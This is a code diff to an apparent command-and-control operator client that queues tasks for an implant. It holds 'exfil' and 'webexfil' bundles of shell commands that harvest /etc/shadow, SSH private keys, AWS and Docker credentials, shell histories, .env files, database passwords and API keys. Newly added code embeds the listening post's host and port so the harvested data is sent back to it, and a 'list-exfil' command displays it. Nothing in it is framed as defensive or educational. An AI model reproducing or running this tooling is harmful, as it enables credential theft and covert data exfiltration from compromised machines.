@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+from asyncio import tasks
 import sys
 import json
 import argparse
@@ -78,33 +79,34 @@ BUNDLES: dict[str, list[dict]] = {
         {"title": "Ping implant", "task_type": "ping"},
     ],
     "exfil": [
-        {"title": "Read /etc/passwd",        "task_type": "execute", "command": "cat /etc/passwd"},
-        {"title": "Read /etc/shadow",        "task_type": "execute", "command": "cat /etc/shadow"},
-        {"title": "Read /etc/hosts",         "task_type": "execute", "command": "cat /etc/hosts"},
-        {"title": "SSH private keys",        "task_type": "execute", "command": "find ~/.ssh -type f -name 'id_*' ! -name '*.pub' -exec cat {} +"},
-        {"title": "SSH authorized keys",     "task_type": "execute", "command": "cat ~/.ssh/authorized_keys 2>/dev/null"},
-        {"title": "Known hosts",             "task_type": "execute", "command": "cat ~/.ssh/known_hosts 2>/dev/null"},
-        {"title": "Bash history",            "task_type": "execute", "command": "cat ~/.bash_history"},
-        {"title": "Zsh history",             "task_type": "execute", "command": "cat ~/.zsh_history 2>/dev/null"},
-        {"title": "Shell config files",      "task_type": "execute", "command": "cat ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null"},
-        {"title": "AWS credentials",         "task_type": "execute", "command": "cat ~/.aws/credentials 2>/dev/null"},
-        {"title": "AWS config",              "task_type": "execute", "command": "cat ~/.aws/config 2>/dev/null"},
-        {"title": "Docker config",           "task_type": "execute", "command": "cat ~/.docker/config.json 2>/dev/null"},
-        {"title": "Git config",              "task_type": "execute", "command": "cat ~/.gitconfig 2>/dev/null"},
-        {"title": "Find .env files",         "task_type": "execute", "command": "find / -name '.env' -not -path '*/proc/*' 2>/dev/null -exec cat {} +"},
-        {"title": "Find private keys",       "task_type": "execute", "command": "find / -name '*.pem' -o -name '*.key' -o -name '*.p12' 2>/dev/null | grep -v proc"},
-        {"title": "Sudo rights",             "task_type": "execute", "command": "sudo -l 2>/dev/null"},
-        {"title": "Recently modified files", "task_type": "execute", "command": "find /home /etc /var/www -type f -mtime -7 2>/dev/null"},
+        {"title": "Read /etc/passwd",        "task_type": "exfil", "command": "cat /etc/passwd"},
+        {"title": "Read /etc/shadow",        "task_type": "exfil", "command": "cat /etc/shadow"},
+        {"title": "Read /etc/hosts",         "task_type": "exfil", "command": "cat /etc/hosts"},
+        {"title": "SSH private keys",        "task_type": "exfil", "command": "find ~/.ssh -type f -name 'id_*' ! -name '*.pub' -exec cat {} +"},
+        {"title": "SSH authorized keys",     "task_type": "exfil", "command": "cat ~/.ssh/authorized_keys 2>/dev/null"},
+        {"title": "Known hosts",             "task_type": "exfil", "command": "cat ~/.ssh/known_hosts 2>/dev/null"},
+        {"title": "Bash history",            "task_type": "exfil", "command": "cat ~/.bash_history"},
+        {"title": "Zsh history",             "task_type": "exfil", "command": "cat ~/.zsh_history 2>/dev/null"},
+        {"title": "Shell config files",      "task_type": "exfil", "command": "cat ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null"},
+        {"title": "AWS credentials",         "task_type": "exfil", "command": "cat ~/.aws/credentials 2>/dev/null"},
+        {"title": "AWS config",              "task_type": "exfil", "command": "cat ~/.aws/config 2>/dev/null"},
+        {"title": "Docker config",           "task_type": "exfil", "command": "cat ~/.docker/config.json 2>/dev/null"},
+        {"title": "Git config",              "task_type": "exfil", "command": "cat ~/.gitconfig 2>/dev/null"},
+        {"title": "Find .env files",         "task_type": "exfil", "command": "find / -name '.env' -not -path '*/proc/*' 2>/dev/null -exec cat {} +"},
+        {"title": "Find private keys",       "task_type": "exfil", "command": "find / -name '*.pem' -o -name '*.key' -o -name '*.p12' 2>/dev/null | grep -v proc"},
+        {"title": "Sudo rights",             "task_type": "exfil", "command": "sudo -l 2>/dev/null"},
+        {"title": "Recently modified files", "task_type": "exfil", "command": "find /home /etc /var/www -type f -mtime -7 2>/dev/null"},
     ],
+
     "webexfil": [
-        {"title": "Find web roots",          "task_type": "execute", "command": "find /var/www /srv /opt -maxdepth 3 -type d 2>/dev/null"},
-        {"title": "Nginx config",            "task_type": "execute", "command": "cat /etc/nginx/nginx.conf 2>/dev/null; ls /etc/nginx/sites-enabled/ 2>/dev/null"},
-        {"title": "Apache config",           "task_type": "execute", "command": "cat /etc/apache2/apache2.conf 2>/dev/null; ls /etc/apache2/sites-enabled/ 2>/dev/null"},
-        {"title": "Find DB credentials",     "task_type": "execute", "command": "grep -r 'DB_PASS\\|DB_PASSWORD\\|database_password' /var/www /opt /srv 2>/dev/null"},
-        {"title": "Find API keys",           "task_type": "execute", "command": "grep -r 'API_KEY\\|SECRET_KEY\\|ACCESS_TOKEN' /var/www /opt /srv 2>/dev/null"},
-        {"title": "Find connection strings", "task_type": "execute", "command": "grep -r 'mongodb://\\|mysql://\\|postgres://\\|redis://' /var/www /opt /srv 2>/dev/null"},
-        {"title": "PHP config files",        "task_type": "execute", "command": "find /var/www -name 'config.php' -o -name 'wp-config.php' -o -name 'settings.php' 2>/dev/null -exec cat {} +"},
-        {"title": "App .env files",          "task_type": "execute", "command": "find /var/www /opt /srv -name '.env' 2>/dev/null -exec cat {} +"},
+        {"title": "Find web roots",          "task_type": "exfil", "command": "find /var/www /srv /opt -maxdepth 3 -type d 2>/dev/null"},
+        {"title": "Nginx config",            "task_type": "exfil", "command": "cat /etc/nginx/nginx.conf 2>/dev/null; ls /etc/nginx/sites-enabled/ 2>/dev/null"},
+        {"title": "Apache config",           "task_type": "exfil", "command": "cat /etc/apache2/apache2.conf 2>/dev/null; ls /etc/apache2/sites-enabled/ 2>/dev/null"},
+        {"title": "Find DB credentials",     "task_type": "exfil", "command": "grep -r 'DB_PASS\\|DB_PASSWORD\\|database_password' /var/www /opt /srv 2>/dev/null"},
+        {"title": "Find API keys",           "task_type": "exfil", "command": "grep -r 'API_KEY\\|SECRET_KEY\\|ACCESS_TOKEN' /var/www /opt /srv 2>/dev/null"},
+        {"title": "Find connection strings", "task_type": "exfil", "command": "grep -r 'mongodb://\\|mysql://\\|postgres://\\|redis://' /var/www /opt /srv 2>/dev/null"},
+        {"title": "PHP config files",        "task_type": "exfil", "command": "find /var/www -name 'config.php' -o -name 'wp-config.php' -o -name 'settings.php' 2>/dev/null -exec cat {} +"},
+        {"title": "App .env files",          "task_type": "exfil", "command": "find /var/www /opt /srv -name '.env' 2>/dev/null -exec cat {} +"},
     ],
 }
 
@@ -171,6 +173,7 @@ HELP_TEXT = f"""
   list-tasks              List all tasks in the database
   list-results            List all results returned by the implant
   list-history            List the full task + result history
+  list-exfil              List all exfiltrated data received from the implant
   addtask <bundle>        Queue every task in a bundle
   bundles                 Show all available bundles
   help                    Show this message
@@ -218,13 +221,16 @@ class LPClient:
     def list_history(self): return self._get("/history")
     def list_exfil(self):   return self._get("/exfil")
 
-    def submit_bundle(self, bundle_name: str) -> list:
-        # Submit multiple tasks sequentially
+    def submit_bundle(self, bundle_name: str, exfil_host: str = None, exfil_port: int = None) -> list:
         tasks = BUNDLES[bundle_name]
         responses = []
         for task in tasks:
-            # Each task is sent as an independent POST request
-            resp = self._post("/tasks", task)
+            payload = dict(task)  # copy
+            # If this is an exfil task, embed the target host/port
+            if payload.get("task_type") == "exfil" and exfil_host and exfil_port:
+                payload["host"] = exfil_host
+                payload["port"] = str(exfil_port)
+            resp = self._post("/tasks", payload)
             responses.append((task, resp))
         return responses
 
@@ -305,29 +311,24 @@ def run_repl(client: LPClient):
             elif cmd == "addtask":
                 if not args:
                     err("Usage: addtask <bundle>")
-                    info(f"Available bundles: {', '.join(BUNDLES.keys())}")
+                    info(f"Available: {', '.join(BUNDLES.keys())}")
                     continue
 
                 bundle_name = args[0].lower()
-
-                # Validate bundle name
                 if bundle_name not in BUNDLES:
                     err(f"Unknown bundle '{bundle_name}'")
                     info(f"Available: {', '.join(BUNDLES.keys())}")
                     continue
 
-                bundle_tasks = BUNDLES[bundle_name]
-                info(f"Queuing {len(bundle_tasks)} task(s) from {bundle_name} ...")
+                # Auto‑detect exfil target from LP connection settings
+                exfil_host = client.base_url.split("://")[-1].split(":")[0]
+                exfil_port = client.base_url.split(":")[-1].split("/")[0]  # crude but works for "https://host:5000"
 
-                # Submit tasks one by one to backend
-                results = client.submit_bundle(bundle_name)
-
-                # Print confirmation
+                results = client.submit_bundle(bundle_name, exfil_host=exfil_host, exfil_port=exfil_port)
                 for task, resp in results:
                     ok(f"  ✓ {task['title']}")
-
                 ok(f"Bundle '{bundle_name}' queued — {len(results)} task(s) submitted.")
-
+                
             ##add configure case, the task_type is "configure"
             ##So the JSON payload should look like this for example:
                     #json[
